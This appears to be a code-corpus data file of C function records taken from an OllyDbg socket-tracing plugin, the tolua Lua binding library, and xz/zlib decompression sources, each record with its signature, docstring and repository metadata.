{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "int  _export cdecl ODBG_Pausedex( int iReason, int iExtData, t_reg * pRegisters, DEBUG_EVENT * pDebugEvent )", "code": "{\n\tif( !bEnabled || pRegisters == NULL && ((iReason & PP_INT3BREAK) != PP_INT3BREAK) )\n\t\treturn 0;\n\n\tif( Breakpoint_Handle( pRegisters, pDebugEvent, &logtable ) )\n\t{\n\t\tGo( 0, 0, STEP_RUN, 1, 1 );\n    \treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "void _export cdecl ODBG_Pluginaction( int iOrigin, int iAction, LPVOID lpItem )", "code": "{\n\tchar cBuffer[BUFFER_SIZE];\n\n\tif( iOrigin == PM_MAIN )\n\t{\n\t\tswitch( iAction )\n\t\t{\n\t\t\t// Enable/Disable\n\t\t\tcase 0:\n\t\t\t\tif( bEnabled )\n\t\t\t\t\tbEnabled = FALSE;\n\t\t\t\telse\n\t\t\t\t\tbEnabled = TRUE;\n\n\t\t\t\tif( bEnabled )\n\t\t\t\t\tbEnabled = Breakpoints_Enable();\n\t\t\t\telse\n\t\t\t\t\tBreakpoints_Disable( TRUE );\n\t\t\t\t\n\t\t\t\tFlash( \"%s %s.\", OLLYST_NAME, ( bEnabled ? \"Enabled\" : \"Disabled\" ) );\n\t\t\t\tbreak;\n\n\t\t\t// View Log\n\t\t\tcase 1:\n\t\t\t\tCreateLogWindow();\n\t\t\t\tbreak;\n\n\t\t\t// About\n\t\t\tcase 2:\n\t\t\t\tsnprintf( cBuffer, BUFFER_SIZE, \"%s v%s\\n%s\", OLLYST_NAME, OLLYST_VERSION, OLLYST_ABOUT );\n\t\t\t\tMessageBox( hOllyWindow, cBuffer, \"About\", MB_OK|MB_ICONINFORMATION );\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSACloseEvent_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    // BOOL WSACloseEvent( WSAEVENT hEvent );\n    DWORD dwParameter;\n\n    if( Readmemory( &dwParameter, pRegisters->r[REG_ESP]+4, sizeof(DWORD), MM_SILENT ) == 0 )\n        return FALSE;\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSACloseEvent( 0x%08X )\", dwParameter );\n\n    return TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSARecv_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    // int WSARecv( SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd,\n    //              LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped,\n    //              LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine );\n    DWORD dwParameters[7];\n    WSABUF wsaBuffer;\n   \tchar cFlagsOutput[MAX_PATH];\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*7, MM_SILENT ) == 0 )\n        return FALSE;\n    pLogData->dwSocket = dwParameters[0];\n\n    if( dwParameters[2] > 0 )\n    {\n        // TO-DO: support multiple buffers...\n        if( Readmemory( &wsaBuffer, dwParameters[1], sizeof(WSABUF), MM_SILENT ) != 0 )\n        {\n            pLogData->dwDbgBuffer     = (DWORD)wsaBuffer.buf;\n\t        pLogData->dwDbgBufferSize = wsaBuffer.len;\n        }\n    }\n\n    pLogData->dwValueA = dwParameters[3];\n\n    ResolveFlags( (struct FLAGS *)&msg_flags, TRUE, dwParameters[4], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSARecv( %d, 0x%08X, %d, 0x%08X, %s, 0x%08X, 0x%08X )\", dwParameters[0], dwParameters[1], dwParameters[2], dwParameters[3], cFlagsOutput, dwParameters[5], dwParameters[6] );\n\n\treturn TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "int _export cdecl ODBG_Pluginmenu( int iOrigin, char cData[4096], LPVOID lpItem )", "code": "{\n\tswitch( iOrigin )\n\t{\n\t\tcase PM_MAIN:\n\t\t\tstrcpy( cData, \"0 &Enable/Disable,1 &View Log,|2 &About\" );\n\t\t\treturn 1;\n\t\tdefault:\n\t\t\tbreak;\n\t}\n\treturn 0;\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "LRESULT CALLBACK LogWindowProc( HWND hw,UINT msg,WPARAM wp,LPARAM lp)", "code": "{\n\tLPLOGDATA pLogData;\n\n\tswitch( msg )\n\t{\n\t\tcase WM_DESTROY:\n\t\tcase WM_MOUSEMOVE:\n\t\tcase WM_LBUTTONDOWN:\n\t\tcase WM_LBUTTONDBLCLK:\n\t\tcase WM_LBUTTONUP:\n\t\tcase WM_RBUTTONDOWN:\n\t\tcase WM_RBUTTONDBLCLK:\n\t\tcase WM_HSCROLL:\n\t\tcase WM_VSCROLL:\n\t\tcase WM_TIMER:\n\t\tcase WM_SYSKEYDOWN:\n\t\tcase WM_USER_SCR:\n\t\tcase WM_USER_VABS:\n\t\tcase WM_USER_VREL:\n\t\tcase WM_USER_VBYTE:\n\t\tcase WM_USER_STS:\n\t\tcase WM_USER_CNTS:\n\t\tcase WM_USER_CHGS:\n\t\tcase WM_KEYDOWN:\n\t\t\treturn Tablefunction( &logtable, hw, msg, wp, lp );\n\t\tcase WM_USER_MENU:\n\t\t\tHandleRightClick( hw );\n\t\t\treturn 0;\n\t\tcase WM_USER_DBLCLK:\n\t\t\tpLogData = (LPLOGDATA)Getsortedbyselection( &(logtable.data), logtable.data.selected );\n\t\t\tif ( pLogData != NULL )\n\t\t\t\tSetcpu( 0, pLogData->dwCallerAddress, 0, 0, CPU_ASMHIST|CPU_ASMCENTER|CPU_ASMFOCUS );\n\t\t\treturn 1;\n\t\tcase WM_USER_CHALL:\n\t\tcase WM_USER_CHMEM:\n\t\t\tInvalidateRect( hw, NULL, FALSE );\n\t\t\treturn 0;\n\t\tcase WM_PAINT:\n\t\t\tPainttable( hw, &logtable, LogWindowGetText );\n\t\t\treturn 0;\n\t\tdefault: break;\n\t}\n\treturn DefMDIChildProc( hw, msg, wp, lp );\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSAEventSelect_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    //int WSAEventSelect( SOCKET s, WSAEVENT hEventObject, long lNetworkEvents );\n    DWORD dwParameters[3];\n\tchar cFlagsOutput[MAX_PATH];\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*3, MM_SILENT ) == 0 )\n        return FALSE;\n\n    pLogData->dwSocket = dwParameters[0];\n\n    ResolveFlags( (struct FLAGS *)&asyncselect_flags, TRUE, dwParameters[2], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSAEventSelect( %d, 0x%08X, %s )\", dwParameters[0], dwParameters[1], cFlagsOutput );\n\n    return TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "/* the equivalent of lua_is* for usertable */\n", "func_signal": "static  int lua_isusertable (lua_State* L, int lo, const char* type)", "code": "{\n  int r = 0;\n  if (lo < 0) lo = lua_gettop(L)+lo+1;\n  lua_pushvalue(L,lo);\n  lua_rawget(L,LUA_REGISTRYINDEX);  /* get registry[t] */\n  if (lua_isstring(L,-1))\n  {\n    r = strcmp(lua_tostring(L,-1),type)==0;\n    if (!r)\n    {\n      /* try const */\n      lua_pushstring(L,\"const \");\n      lua_insert(L,-2);\n      lua_concat(L,2);\n      r = lua_isstring(L,-1) && strcmp(lua_tostring(L,-1),type)==0;\n    }\n  }\n  lua_pop(L, 1);\n  return r;\n}", "path": "src\\lib\\tolua_is.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map constant number\n * It assigns a constant number into the current module (or class)\n */\n", "func_signal": "TOLUA_API void tolua_constant (lua_State* L, const char* name, double value)", "code": "{\n  lua_pushstring(L,name);\n  tolua_pushnumber(L,value);\n  lua_rawset(L,-3);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map function\n * It assigns a function into the current module (or class)\n */\n", "func_signal": "TOLUA_API void tolua_function (lua_State* L, const char* name, lua_CFunction func)", "code": "{\n  lua_pushstring(L,name);\n  lua_pushcfunction(L,func);\n  lua_rawset(L,-3);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Create metatable\n * Create and register new metatable\n */\n", "func_signal": "void tolua_newmetatable (lua_State* L, const char* name)", "code": "{\n  if (luaL_newmetatable(L,TOLUANAME(name)))\n  {\n    lua_pushvalue(L,-1);\n    lua_pushstring(L,name);\n    lua_rawset(L,LUA_REGISTRYINDEX);\n  }\n\n  /* set meta events */\n  tolua_classevents(L);\n  lua_pop(L,1);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Do clone\n */\n", "func_signal": "TOLUA_API void* tolua_clone (lua_State* L, void* value, lua_CFunction func)", "code": "{\n  lua_pushstring(L,\"tolua_gc\");\n  lua_rawget(L,LUA_REGISTRYINDEX);\n  lua_pushlightuserdata(L,value);\n  lua_pushcfunction(L,func);\n  lua_rawset(L,-3);\n  lua_pop(L,1);\n  return value;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* the equivalent of lua_is* for usertype */\n", "func_signal": "static int lua_isusertype (lua_State* L, int lo, const char* type)", "code": "{\n  if (lua_isuserdata(L,lo))\n  {\n    /* check if it is of the same type */\n    int r;\n    const char *tn;\n    if (lua_getmetatable(L,lo))        /* if metatable? */\n    {\n      lua_rawget(L,LUA_REGISTRYINDEX);  /* get registry[mt] */\n      tn = lua_tostring(L,-1);\n      r = tn && (strcmp(tn,type) == 0);\n      lua_pop(L, 1);\n      if (r)\n        return 1;\n      else\n      {\n        /* check if it is a specialized class */\n        lua_pushstring(L,\"tolua_super\");\n        lua_rawget(L,LUA_REGISTRYINDEX); /* get super */\n        lua_getmetatable(L,lo);\n        lua_rawget(L,-2);                /* get super[mt] */\n        if (lua_istable(L,-1))\n        {\n          int b;\n          lua_pushstring(L,type);\n          lua_rawget(L,-2);                /* get super[mt][type] */\n          b = lua_toboolean(L,-1);\n          lua_pop(L,3);\n          if (b)\n            return 1;\n        }\n      }\n    }\n  }\n  return 0;\n}", "path": "src\\lib\\tolua_is.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map inheritance\n * It sets 'name' as derived from 'base' by setting 'base' as metatable of 'name'\n */\n", "func_signal": "static void mapinheritance (lua_State* L, const char* name, const char* base)", "code": "{\n  /* set metatable inheritance */\n  tolua_getmetatable(L,name);\n  if (base && *base)\n    tolua_getmetatable(L,base);\n  else\n    tolua_getmetatable(L,\"tolua_commonclass\");\n  lua_setmetatable(L,-2);\n  lua_pop(L,1);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Begin module\n * It pushes the module (or class) table on the stack\n */\n", "func_signal": "TOLUA_API void tolua_beginmodule (lua_State* L, const char* name)", "code": "{\n  if (name)\n  {\n    lua_pushstring(L,name);\n    lua_rawget(L,-2);\n  }\n  else\n    tolua_push_globals_table(L);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map variable\n * It assigns a variable into the current module (or class)\n */\n", "func_signal": "TOLUA_API void tolua_variable (lua_State* L, const char* name, lua_CFunction get, lua_CFunction set)", "code": "{\n  /* get func */\n  lua_pushstring(L,\".get\");\n  lua_rawget(L,-2);\n  if (!lua_istable(L,-1))\n  {\n    /* create .get table, leaving it at the top */\n    lua_pop(L,1);\n    lua_newtable(L);\n    lua_pushstring(L,\".get\");\n    lua_pushvalue(L,-2);\n    lua_rawset(L,-4);\n  }\n  lua_pushstring(L,name);\n  lua_pushcfunction(L,get);\n  lua_rawset(L,-3);                  /* store variable */\n  lua_pop(L,1);                      /* pop .get table */\n\n  /* set func */\n  if (set)\n  {\n    lua_pushstring(L,\".set\");\n    lua_rawget(L,-2);\n    if (!lua_istable(L,-1))\n    {\n      /* create .set table, leaving it at the top */\n      lua_pop(L,1);\n      lua_newtable(L);\n      lua_pushstring(L,\".set\");\n      lua_pushvalue(L,-2);\n      lua_rawset(L,-4);\n    }\n    lua_pushstring(L,name);\n    lua_pushcfunction(L,set);\n    lua_rawset(L,-3);                  /* store variable */\n    lua_pop(L,1);                      /* pop .set table */\n  }\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Release ownership\n */\n", "func_signal": "static int tolua_bnd_releaseownership (lua_State* L)", "code": "{\n  int done = 0;\n  if (lua_isuserdata(L,1))\n  {\n    void* u = *((void**)lua_touserdata(L,1));\n    lua_pushstring(L,\"tolua_gc\");\n    lua_rawget(L,LUA_REGISTRYINDEX);\n    lua_pushlightuserdata(L,u);\n    lua_rawget(L,-2);\n    lua_pushlightuserdata(L,u);\n    lua_pushnil(L);\n    lua_rawset(L,-4);\n    done = 1;\n  }\n  lua_pushboolean(L,done!=0);\n  return 1;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map super classes\n * It sets 'name' as being also a 'base', mapping all super classes of 'base' in 'name'\n */\n", "func_signal": "static void mapsuper (lua_State* L, const char* name, const char* base)", "code": "{\n  /* push registry.super */\n  lua_pushstring(L,\"tolua_super\");\n  lua_rawget(L,LUA_REGISTRYINDEX);    /* stack: super */\n  tolua_getmetatable(L,name);          /* stack: super mt */\n  lua_rawget(L,-2);                   /* stack: super table */\n  if (lua_isnil(L,-1))\n  {\n    /* create table */\n    lua_pop(L,1);\n    lua_newtable(L);                    /* stack: super table */\n    tolua_getmetatable(L,name);          /* stack: super table mt */\n    lua_pushvalue(L,-2);                /* stack: super table mt table */\n    lua_rawset(L,-4);                   /* stack: super table */\n  }\n\n  /* set base as super class */\n  lua_pushstring(L,base);\n  lua_pushboolean(L,1);\n  lua_rawset(L,-3);                    /* stack: super table */\n\n  /* set all super class of base as super class of name */\n  tolua_getmetatable(L,base);          /* stack: super table base_mt */\n  lua_rawget(L,-3);                   /* stack: super table base_table */\n  if (lua_istable(L,-1))\n  {\n    /* traverse base table */\n    lua_pushnil(L);  /* first key */\n    while (lua_next(L,-2) != 0)\n    {\n      /* stack: ... base_table key value */\n      lua_pushvalue(L,-2);    /* stack: ... base_table key value key */\n      lua_insert(L,-2);       /* stack: ... base_table key key value */\n      lua_rawset(L,-5);       /* stack: ... base_table key */\n    }\n  }\n  lua_pop(L,3);                       /* stack: <empty> */\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Take ownership\n */\n", "func_signal": "int tolua_bnd_takeownership (lua_State* L)", "code": "{\n  lua_CFunction func = 0;\n  if (lua_isuserdata(L,1))\n  {\n    if (lua_getmetatable(L,1))        /* if metatable? */\n    {\n      void* u;\n      lua_pushstring(L,\".collector\");\n      lua_rawget(L,-2);\n      func = lua_iscfunction(L,-1) ? lua_tocfunction(L,-1) : NULL; \n      lua_pop(L,2);\n      u = *((void**)lua_touserdata(L,1));\n      tolua_clone(L,u,func);\n    }\n  }\n  lua_pushboolean(L,func!=0);\n  return 1;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Register a usertype\n * It creates the correspoding metatable in the registry, for both 'type' and 'const type'.\n * It maps 'const type' as being also a 'type'\n */\n", "func_signal": "TOLUA_API void tolua_usertype (lua_State* L, const char* type)", "code": "{\n  char ctype[128] = \"const \";\n  strncat(ctype,type,120);\n\n  tolua_newmetatable(L,ctype);         /* create both metatables */\n  tolua_newmetatable(L,type);\n\n  mapsuper(L,type,ctype);             /* 'type' is also a 'const type' */\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Map an array\n * It assigns an array into the current module (or class)\n */\n", "func_signal": "TOLUA_API void tolua_array (lua_State* L, const char* name, lua_CFunction get, lua_CFunction set)", "code": "{\n  lua_pushstring(L,\".get\");\n  lua_rawget(L,-2);\n  if (!lua_istable(L,-1))\n  {\n    /* create .get table, leaving it at the top */\n    lua_pop(L,1);\n    lua_newtable(L);\n    lua_pushstring(L,\".get\");\n    lua_pushvalue(L,-2);\n    lua_rawset(L,-4);\n  }\n  lua_pushstring(L,name);\n\n  lua_newtable(L);           /* create array metatable */\n  lua_pushvalue(L,-1);\n  lua_setmetatable(L,-2);    /* set the own table as metatable (for modules) */\n  lua_pushstring(L,\"__index\");\n  lua_pushcfunction(L,get);\n  lua_rawset(L,-3);\n  lua_pushstring(L,\"__newindex\");\n  lua_pushcfunction(L,set?set:const_array);\n  lua_rawset(L,-3);\n\n  lua_rawset(L,-3);                  /* store variable */\n  lua_pop(L,1);                      /* pop .get table */\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Object type\n */\n", "func_signal": "static int tolua_bnd_type (lua_State* L)", "code": "{\n  tolua_typename(L,lua_gettop(L));\n  return 1;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Release userdata from tolua\n */\n", "func_signal": "TOLUA_API void tolua_release (lua_State* L, void* value)", "code": "{\n  void** p;\n  lua_pushstring(L,\"tolua_ubox\");\n  lua_rawget(L,LUA_REGISTRYINDEX); /* stack: ubox */\n  lua_pushlightuserdata(L,value);  /* stack: ubox u */\n  /* set userdata pointer to NULL: this pointer might be reused by C/C++ */\n  lua_rawget(L,-2);                /* stack: ubox ud */\n  p = (void**)lua_touserdata(L,-1);\n  if (p) *p = NULL;\n      /* fixed bug: thanks to Ulrik Sverdrup -- it was 1 instead of -1 */\n  lua_pop(L,1);                    /* stack: ubox */\n  /* remove value from ubox */\n  lua_pushlightuserdata(L,value);  /* stack: ubox u */\n  lua_pushnil(L);\n  lua_rawset(L,-3);\n  lua_pop(L,1);\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Access const array\n * It reports an error when trying to write into a const array\n */\n", "func_signal": "static int const_array (lua_State* L)", "code": "{\n  luaL_error(L,\"value of const array cannot be changed\");\n  return 0;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Copy a C object\n */\n", "func_signal": "TOLUA_API void* tolua_copy (lua_State* L, void* value, unsigned int size)", "code": "{\n  void* clone = (void*)malloc(size);\n  if (clone)\n    memcpy(clone,value,size);\n  else\n    tolua_error(L,\"insuficient memory\",NULL);\n  return clone;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Push and returns the corresponding object typename */\n", "func_signal": "TOLUA_API const char* tolua_typename (lua_State* L, int lo)", "code": "{\n  int tag = lua_type(L,lo);\n  if (tag == LUA_TNONE)\n    lua_pushstring(L,\"[no object]\");\n  else if (tag != LUA_TUSERDATA && tag != LUA_TTABLE)\n    lua_pushstring(L,lua_typename(L,tag));\n  else if (tag == LUA_TUSERDATA)\n  {\n    if (!lua_getmetatable(L,lo)) {\n     lua_pushstring(L,lua_typename(L,tag));\n    }\n    else\n    {\n      lua_rawget(L,LUA_REGISTRYINDEX);\n      if (!lua_isstring(L,-1))\n      {\n        lua_pop(L,1);\n        lua_pushstring(L,\"[undefined]\");\n      }\n    }\n  }\n  else  /* is table */\n  {\n    lua_pushvalue(L,lo);\n    lua_rawget(L,LUA_REGISTRYINDEX);\n    if (!lua_isstring(L,-1))\n    {\n      lua_pop(L,1);\n      lua_pushstring(L,\"table\");\n    }\n    else\n    {\n      lua_pushstring(L,\"class \");\n      lua_insert(L,-2);\n      lua_concat(L,2);\n    }\n  }\n  return lua_tostring(L,-1);\n}", "path": "src\\lib\\tolua_is.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/* Type casting\n */\n", "func_signal": "static int tolua_bnd_cast (lua_State* L)", "code": "{\n  void* v = tolua_tousertype(L,1,NULL);\n  const char* s = tolua_tostring(L,2,NULL);\n  if (!v)\n    lua_pushnil(L);\n  else if (v && s) {\n    tolua_getmetatable(L,s);             /* stack: ubox[u] super super[mt] flag mt */\n    if (lua_isnil(L,-1)) {\n      tolua_error(L,\"Unknown 'type' for 'tolua.cast' function\",NULL);\n    }\n    tolua_pushusertype(L,v,s);\n  }\n  else {\n    tolua_error(L,\"Invalid arguments for 'tolua.cast' function\",NULL);\n  }\n  return 1;\n}", "path": "src\\lib\\tolua_map.c", "repo_name": "LuaDist/tolua", "stars": 60, "license": "None", "language": "c", "size": 212}
{"docstring": "/*\n * Decode the Compressed Data field from a Block. Update and validate\n * the observed compressed and uncompressed sizes of the Block so that\n * they don't exceed the values possibly stored in the Block Header\n * (validation assumes that no integer overflow occurs, since vli_type\n * is normally uint64_t). Update the CRC32 if presence of the CRC32\n * field was indicated in Stream Header.\n *\n * Once the decoding is finished, validate that the observed sizes match\n * the sizes possibly stored in the Block Header. Update the hash and\n * Block count, which are later used to validate the Index field.\n */\n", "func_signal": "static enum xz_ret dec_block(struct xz_dec *s, struct xz_buf *b)", "code": "{\n\tenum xz_ret ret;\n\n\ts->in_start = b->in_pos;\n\ts->out_start = b->out_pos;\n\n#ifdef XZ_DEC_BCJ\n\tif (s->bcj_active)\n\t\tret = xz_dec_bcj_run(s->bcj, s->lzma2, b);\n\telse\n#endif\n\t\tret = xz_dec_lzma2_run(s->lzma2, b);\n\n\ts->block.compressed += b->in_pos - s->in_start;\n\ts->block.uncompressed += b->out_pos - s->out_start;\n\n\t/*\n\t * There is no need to separately check for VLI_UNKNOWN, since\n\t * the observed sizes are always smaller than VLI_UNKNOWN.\n\t */\n\tif (s->block.compressed > s->block_header.compressed\n\t\t\t|| s->block.uncompressed\n\t\t\t\t> s->block_header.uncompressed)\n\t\treturn XZ_DATA_ERROR;\n\n\tif (s->check_type == XZ_CHECK_CRC32)\n\t\ts->crc32 = xz_crc32(b->out + s->out_start,\n\t\t\t\tb->out_pos - s->out_start, s->crc32);\n\n\tif (ret == XZ_STREAM_END) {\n\t\tif (s->block_header.compressed != VLI_UNKNOWN\n\t\t\t\t&& s->block_header.compressed\n\t\t\t\t\t!= s->block.compressed)\n\t\t\treturn XZ_DATA_ERROR;\n\n\t\tif (s->block_header.uncompressed != VLI_UNKNOWN\n\t\t\t\t&& s->block_header.uncompressed\n\t\t\t\t\t!= s->block.uncompressed)\n\t\t\treturn XZ_DATA_ERROR;\n\n\t\ts->block.hash.unpadded += s->block_header.size\n\t\t\t\t+ s->block.compressed;\n\n#ifdef XZ_DEC_ANY_CHECK\n\t\ts->block.hash.unpadded += check_sizes[s->check_type];\n#else\n\t\tif (s->check_type == XZ_CHECK_CRC32)\n\t\t\ts->block.hash.unpadded += 4;\n#endif\n\n\t\ts->block.hash.uncompressed += s->block.uncompressed;\n\t\ts->block.hash.crc32 = xz_crc32(\n\t\t\t\t(const uint8_t *)&s->block.hash,\n\t\t\t\tsizeof(s->block.hash), s->block.hash.crc32);\n\n\t\t++s->block.count;\n\t}\n\n\treturn ret;\n}", "path": "resources\\lib\\xz\\xz_dec_stream.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Decode and validate LZMA properties (lc/lp/pb) and calculate the bit masks\n * from the decoded lp and pb values. On success, the LZMA decoder state is\n * reset and true is returned.\n */\n", "func_signal": "static bool lzma_props(struct xz_dec_lzma2 *s, uint8_t props)", "code": "{\n\tif (props > (4 * 5 + 4) * 9 + 8)\n\t\treturn false;\n\n\ts->lzma.pos_mask = 0;\n\twhile (props >= 9 * 5) {\n\t\tprops -= 9 * 5;\n\t\t++s->lzma.pos_mask;\n\t}\n\n\ts->lzma.pos_mask = (1 << s->lzma.pos_mask) - 1;\n\n\ts->lzma.literal_pos_mask = 0;\n\twhile (props >= 9) {\n\t\tprops -= 9;\n\t\t++s->lzma.literal_pos_mask;\n\t}\n\n\ts->lzma.lc = props;\n\n\tif (s->lzma.lc + s->lzma.literal_pos_mask > 4)\n\t\treturn false;\n\n\ts->lzma.literal_pos_mask = (1 << s->lzma.literal_pos_mask) - 1;\n\n\tlzma_reset(s);\n\n\treturn true;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Reset the LZMA decoder and range decoder state. Dictionary is nore reset\n * here, because LZMA state may be reset without resetting the dictionary.\n */\n", "func_signal": "static void lzma_reset(struct xz_dec_lzma2 *s)", "code": "{\n\tuint16_t *probs;\n\tsize_t i;\n\n\ts->lzma.state = STATE_LIT_LIT;\n\ts->lzma.rep0 = 0;\n\ts->lzma.rep1 = 0;\n\ts->lzma.rep2 = 0;\n\ts->lzma.rep3 = 0;\n\n\t/*\n\t * All probabilities are initialized to the same value. This hack\n\t * makes the code smaller by avoiding a separate loop for each\n\t * probability array.\n\t *\n\t * This could be optimized so that only that part of literal\n\t * probabilities that are actually required. In the common case\n\t * we would write 12 KiB less.\n\t */\n\tprobs = s->lzma.is_match[0];\n\tfor (i = 0; i < PROBS_TOTAL; ++i)\n\t\tprobs[i] = RC_BIT_MODEL_TOTAL / 2;\n\n\trc_reset(&s->rc);\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Skip over the Check field when the Check ID is not supported.\n * Returns true once the whole Check field has been skipped over.\n */\n", "func_signal": "static bool check_skip(struct xz_dec *s, struct xz_buf *b)", "code": "{\n\twhile (s->pos < check_sizes[s->check_type]) {\n\t\tif (b->in_pos == b->in_size)\n\t\t\treturn false;\n\n\t\t++b->in_pos;\n\t\t++s->pos;\n\t}\n\n\ts->pos = 0;\n\n\treturn true;\n}", "path": "resources\\lib\\xz\\xz_dec_stream.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n   Search buf[0..len-1] for the pattern: 0, 0, 0xff, 0xff.  Return when found\n   or when out of input.  When called, *have is the number of pattern bytes\n   found in order so far, in 0..3.  On return *have is updated to the new\n   state.  If on return *have equals four, then the pattern was found and the\n   return value is how many bytes were read including the last byte of the\n   pattern.  If *have is less than four, then the pattern has not been found\n   yet and the return value is len.  In the latter case, zlib_syncsearch() can be\n   called again with more data and the *have state.  *have is initialized to\n   zero for the first call.\n */\n", "func_signal": "static unsigned zlib_syncsearch(unsigned *have, unsigned char *buf,\n        unsigned len)", "code": "{\n    unsigned got;\n    unsigned next;\n\n    got = *have;\n    next = 0;\n    while (next < len && got < 4) {\n        if ((int)(buf[next]) == (got < 2 ? 0 : 0xff))\n            got++;\n        else if (buf[next])\n            got = 0;\n        else\n            got = 4 - got;\n        next++;\n    }\n    *have = got;\n    return next;\n}", "path": "resources\\lib\\zlib_inflate\\inflate.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
